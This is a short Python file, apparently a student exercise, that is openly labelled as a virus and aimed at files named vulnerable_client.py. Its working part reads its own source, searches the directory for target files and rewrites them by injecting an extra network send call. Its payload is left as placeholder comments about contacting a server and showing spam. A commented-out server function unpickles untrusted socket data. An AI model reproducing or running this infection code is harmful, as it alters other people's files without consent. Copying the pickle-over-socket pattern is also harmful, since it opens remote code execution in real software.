

# def server_run():
#     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server.bind(('', 0))
#     server.setblocking(0)
#     server.listen(2)
#
#     while True:
#         try:
#             (c, address) = server.accept()
#             data = c.recv(4096)
#             message = pickle.loads(data)
#             # append message into receiver list OR append c, address to receiver list
#             # break
#         except socket.error:
#             print (socket.error.message)


## VIRUS BEGIN ##
import re
import sys
import os
import fileinput
# import glob
# import victim_set
import socket
import pickle
# from victim_set import *

# get a copy of the virus
v_code = []
v_file = open(sys.argv[0], "r")
v_lines = v_file.readlines()
v_file.close()

virus = False
for v_line in v_lines:
    if re.search('## VIRUS BEGIN ##', v_line):
        virus = True
    if virus:
        v_code.append(v_line)

# find victims in the vulnerable set
victims = []
for root, dirs, files in os.walk(os.path.curdir):
    for f in files:
        # if f == "vulnerable_program.py":
        if f == "vulnerable_client.py":
            print("victim is: " + f)
            victims.append(f)

#infect
for v in victims:
    v_file = open(v, "r")
    v_lines = v_file.readlines()
    v_file.close()
    infected = False
    for line in v_lines:
        if re.search('## VIRUS BEGIN ##', line):
            infected = True
            break
    if not infected:
        with open(v, 'r+') as fh:
            lines = fh.readlines()
            for index, line in enumerate(lines, 1):
                if re.match(r'(.*) = PerfectPointToPointLinks(.*)', line):
                    (firstWord, rest) = line.split(maxsplit=1)
                    print (firstWord + ".send(self.addr, self.port) at line " + str(index))
                    lines.insert(index, "\n    " + firstWord + ".send(0, '', (process_id+10000, addr))")
            fh.seek(0)
            fh.writelines(lines)
            fh.close()

        # v_file = open(v, "w")
        # v_code.extend(v_lines)
        # v_file.writelines(v_code)
        # v_file.close()

#payload
print("infected")
## open socket - check ip address and send over???

## connect to our server
## receive spam message and desplay

## VIRUS END ##

